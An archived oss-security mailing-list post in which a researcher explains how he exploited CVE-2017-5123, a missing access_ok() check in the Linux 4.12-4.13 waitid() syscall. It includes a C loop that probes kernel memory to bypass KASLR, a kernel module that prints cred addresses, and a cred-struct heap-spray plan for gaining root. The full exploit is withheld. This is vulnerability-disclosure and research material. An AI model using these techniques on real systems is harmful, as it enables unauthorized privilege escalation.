X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["12561" "Tuesday" "7" "November" "2017" "02:38:03" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20171107023803.1312485e7yc7rvcw@webmail.alunos.dcc.fc.up.pt>" "395" "Re: [oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()" nil nil nil "11" "2017110701:38:03" "[oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()" (number mark "U       up201407890@ Nov  7  395/12561 " thread-indent "\"Re: [oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid() not calling access_ok()\"\n") "<20171105135833.15025s7hrnp0yd4w@webmail.alunos.dcc.fc.up.pt>" ("<20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>" "<20171105135833.15025s7hrnp0yd4w@webmail.alunos.dcc.fc.up.pt>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24303 invoked by uid 550); 7 Nov 2017 11:07:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27892 invoked from network); 7 Nov 2017 01:38:45 -0000
Message-ID: <20171107023803.1312485e7yc7rvcw@webmail.alunos.dcc.fc.up.pt>
Date: Tue, 07 Nov 2017 02:38:03 +0100
From: up201407890@alunos.dcc.fc.up.pt
To: up201407890@alunos.dcc.fc.up.pt
Cc: oss-security@lists.openwall.com
References: <20171025124241.12925hypflmm08sg@webmail.alunos.dcc.fc.up.pt>
	<20171105135833.15025s7hrnp0yd4w@webmail.alunos.dcc.fc.up.pt>
In-Reply-To: <20171105135833.15025s7hrnp0yd4w@webmail.alunos.dcc.fc.up.pt>
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: Re: [oss-security] Re: CVE-2017-5123 Linux kernel v4.13 waitid()
	not calling access_ok()

This will be a fast writeup on how I exploited CVE-2017-5123, a Linux=20=20
kernel vulnerability in the waitid() syscall for 4.12-4.13, which=20=20
gives an attacker a "write-not-what-only-where" primitive, or in other=20=20
words, the ability to write "non-controlled" user data to arbitrary=20=20
kernel memory.
KASLR is bypassed using memory probing and root obtained via cred=20=20
struct spraying and location predictability.

The video demonstrating my exploit in action was published on November=20=20
5th, as it can be seen here:

https://www.youtube.com/watch?v=3DDfwOJIcV5ZA


Surprisingly, Chris Salls independently published his own writeup and=20=20
exploit on November 6th. Awesome work there!
https://salls.github.io/Linux-Kernel-CVE-2017-5123/

So now, November 7th (0:30 a.m here in Portugal!), I'll be detailing=20=20
how I used this "write-not-what-only-where" vulnerability without a=20=20
single read to get root.

Obviously, given other vulnerabilities, such as certain infoleaks, it=20=20
would be an instant game over.

What spiked some interest to me, was what could one actually do with=20=20
only this vulnerability by itself, or other vulnerabilities of this=20=20
type, assuming all vanilla kernel protections.
It's powerful, but some would initially assume that it's not enough to=20=20
increase our privileges these days.





The vulnerability:

from kernel/exit.c:

SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
                                   infop, int, options, struct rusage=20=20
__user *, ru)
{
     struct rusage r;
     struct waitid_info info =3D {.status =3D 0};
     long err =3D kernel_waitid(which, upid, &info, options, ru ? &r : NULL=
);
     int signo =3D 0;

     if (err > 0) {
         signo =3D SIGCHLD;
         err =3D 0;
         if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
             return -EFAULT;
         }
         if (!infop)
             return err;

         user_access_begin();
         unsafe_put_user(signo, &infop->si_signo, Efault);
         unsafe_put_user(0, &infop->si_errno, Efault);
         unsafe_put_user(info.cause, &infop->si_code, Efault);
         unsafe_put_user(info.pid, &infop->si_pid, Efault);
         unsafe_put_user(info.uid, &infop->si_uid, Efault);
         unsafe_put_user(info.status, &infop->si_status, Efault);
         user_access_end();
         return err;
Efault:
         user_access_end();
         return -EFAULT;
}


The vulnerability here is that there's a missing access_ok() check in=20=20
the waitid() syscall since they've introduced unsafe_put_user() in 4.12.
The macro access_ok() should basically ensure that the user specified=20=20
ptr points to user space and not kernel space, since unprivileged=20=20
users shouldn't be able to write arbitrarily to kernel memory.
This is done by checking the address limit.

from arch/x86/include/asm/uaccess.h

#define user_addr_max() (current->thread.addr_limit.seg)

...

/*
  * Test whether a block of memory is a valid user space address.
  * Returns 0 if the range is valid, nonzero otherwise.
  */
static inline bool __chk_range_not_ok(unsigned long addr, unsigned=20=20
long size, unsigned long limit)
{
	/*
	 * If we have used "sizeof()" for the size,
	 * we know it won't overflow the limit (but
	 * it might overflow the 'addr', so it's
	 * important to subtract the size from the
	 * limit, not add it to the address).
	 */
	if (__builtin_constant_p(size))
		return unlikely(addr > limit - size);

	/* Arbitrary sizes? Be careful about overflow */
	addr +=3D size;
	if (unlikely(addr < size))
		return true;
	return unlikely(addr > limit);
}

#define __range_not_ok(addr, size, limit)				\
({									\
	__chk_user_ptr(addr);						\
	__chk_range_not_ok((unsigned long __force)(addr), size, limit); \
})

...

#define access_ok(type, addr, size)					\
({									\
	WARN_ON_IN_IRQ();						\
	likely(!__range_not_ok(addr, size, user_addr_max()));		\
})



This means that this vulnerability allows an unprivileged user to=20=20
specify a kernel address by using infop when calling waitid(), and the=20=20
kernel will happily write to it.
What is actually written though is hardly controlled.
 From Chris' post: "info.status is a 32 bit int, but constrained to be=20=20
0 < status < 256. info.pid can be somewhat controlled by repeatedly=20=20
forking, but has a max value of 0x8000."

This, however, did not interest me. What interested me was that we=20=20
could write 0's into arbitrary kernel memory.
Here's what differentiates my exploit from Chris' - If we could=20=20
somehow find our cred's structure, we could write 0's there to=20=20
effectively get root privileges by overwriting cred->euid and cred->uid.

from include/linux/cred.h:

struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are=20=20
relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};


At this point we are completely blind though, we need a way to bypass=20=20
KASLR and find the kernel heap.





KASLR bypass via memory probing:

By using functions such as copy_from_user/copy_to_user, etc., we make=20=20
sure that a kernel OOPS won't happen when a bad address is specified=20=20
via page fault exception handler.
This makes sense, since unprivileged users shouldn't be able to cause=20=20
a DoS whenever they present an address that does not belong to the=20=20
address space of the user space process.
The same happens by using unsafe_put_user(), which means that we can=20=20
do some memory probing on the range of possible locations for the=20=20
kernel heap!
I do this by using something along the lines of:

for(i =3D (char *)0xffff880000000000; ; i+=3D0x10000000) {
	pid =3D fork();
	if (pid > 0) {
		if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >=3D 0=
) {
			printf("[+] Found %p\n", i);
			break;
		}
	}
	else if (pid =3D=3D 0)
		exit(0);
}

The trick here is that waitid() won't return -EFAULT when we present=20=20
it a valid address, so we can do some memory probing this way.
Thanks for the enlightenment spender, not the exploits (well actually=20=20
those were pretty cool at the time) :)

Now that we know where the kernel heap lives, how do we know where our=20=20
cred's structure live? The state of the kernel heap is pretty much=20=20
unknown.





Heap Spraying:

At this point I already had a clear idea of what I wanted/needed.
If we create hundreds or thousands of processes, hundreds or thousands=20=20
of cred structures will be created in the kernel heap.
So my idea was to create these many processes that will check in a=20=20
loop if they get euid of 0, by constantly calling geteuid.
If geteuid returns 0, it means that we have hit the jackpot! From=20=20
there, we can also write to cred->euid - 0x10, which is cred->uid.

By spraying the heap we higher the probability of hitting our target,=20=20
but it is obviously not 100% reliable, just like Chris mentions in his=20=20
heap spray.
Given the primitive we have, heap spraying obviously helps here :)

When spraying the heap with multiple struct cred's and observed their=20=20
location, I noticed that some addresses are more likely than others to=20=20
where the creds will reside.
This can be observed without the need for some kernel debugging if one=20=20
wants to try it out easily, simply use this kernel module which prints=20=20
where cred->euid lives.



#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/fs.h>		// for basic filesystem
#include <linux/proc_fs.h>	// for the proc filesystem
#include <linux/seq_file.h>	// for sequence files

static struct proc_dir_entry* jif_file;

static int
jif_show(struct seq_file *m, void *v)
{
	return 0;
}

static int
jif_open(struct inode *inode, struct file *file)
{
      printk("EUID: %p\n", &current->cred->euid);
      return single_open(file, jif_show, NULL);
}

static const struct file_operations jif_fops =3D {
     .owner	=3D THIS_MODULE,
     .open	=3D jif_open,
     .read	=3D seq_read,
     .llseek	=3D seq_lseek,
     .release	=3D single_release,
};

static int __init
jif_init(void)
{
     jif_file =3D proc_create("jif", 0, NULL, &jif_fops);

     if (!jif_file) {
         return -ENOMEM;
     }

     return 0;
}

static void __exit
jif_exit(void)
{
     remove_proc_entry("jif", NULL);
}

module_init(jif_init);
module_exit(jif_exit);

MODULE_LICENSE("GPL");


By forking() and opening /proc/jif repeatedly, we can later check the=20=20
output of printk using dmesg.

# dmesg | grep EUID\:

[16485.192353] EUID: ffff88015e909a14
[16485.192415] EUID: ffff88015e9097d4
[16485.192475] EUID: ffff88015e909954
[16485.192537] EUID: ffff880126c627d4
[16485.192599] EUID: ffff88015e9094d4
[16485.192660] EUID: ffff88015e909414
[16485.192725] EUID: ffff88015e909294
[16485.192790] EUID: ffff88015e909054
[16485.192860] EUID: ffff8801358efdd4
[16485.192925] EUID: ffff8801358efd14
[16485.192991] EUID: ffff8801358efe94
[16485.193057] EUID: ffff88015e909354
[16485.193124] EUID: ffff88015e9091d4
[16485.193187] EUID: ffff8801358eff54
[16485.193249] EUID: ffff8801358efb94
[16485.193314] EUID: ffff8801358efa14
[16485.193381] EUID: ffff88015e909114
[16485.193449] EUID: ffff8801358ef894
[16485.193515] EUID: ffff8801358ef714
[16485.234054] EUID: ffff880125766d14
[16485.234150] EUID: ffff8801256e9954
[16485.234189] EUID: ffff8801256e9654
[16485.429875] EUID: ffff8801257661d4
[16485.429881] EUID: ffff8801256e9e94
[16485.603481] EUID: ffff8801358ef954
[16485.603543] EUID: ffff8801256e9b94
[16485.603582] EUID: ffff880126c62e94
[16485.603620] EUID: ffff8801358ef7d4
[16485.603658] EUID: ffff880126c62a14
[16485.603701] EUID: ffff880125766654
[16485.603743] EUID: ffff8801358ef654
[16485.603782] EUID: ffff8801257667d4
[16485.603824] EUID: ffff880125766a14
[16485.603864] EUID: ffff880125766b94
[16485.603906] EUID: ffff8801256e94d4
[16485.603943] EUID: ffff8801256e91d4
[16485.603979] EUID: ffff880126c62d14
[16485.604017] EUID: ffff88015e909654

[...]

We can kind of guess where they might be located, but obviously it's=20=20
just guessing :)
So now we know that at heap base + some offset, the probability of=20=20
hitting our target is kind of high compared to the rest.
And so I start writing to these and adding PAGESIZE in hope that we=20=20
overwrite one of these processes' credentials.
If that happens, we win!





The exploit:

If you've read everything all the way down here, then I'm sure you can=20=20
write your own... It's not that hard!
I've provided you with all the necessary information on how I=20=20
exploited it. If I can, you can too. :)




Conclusion:

You've now seen that a vulnerability of this type, by itself, can=20=20
still be dangerous when exploiting the Linux kernel.
Thanks again spender, Andr=E9 Baptista (@0xACB), and all xSTF.
Shout-out to .pt :)


Happy Hacking!

https://twitter.com/uid1000

Thanks,
Federico Bento.

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

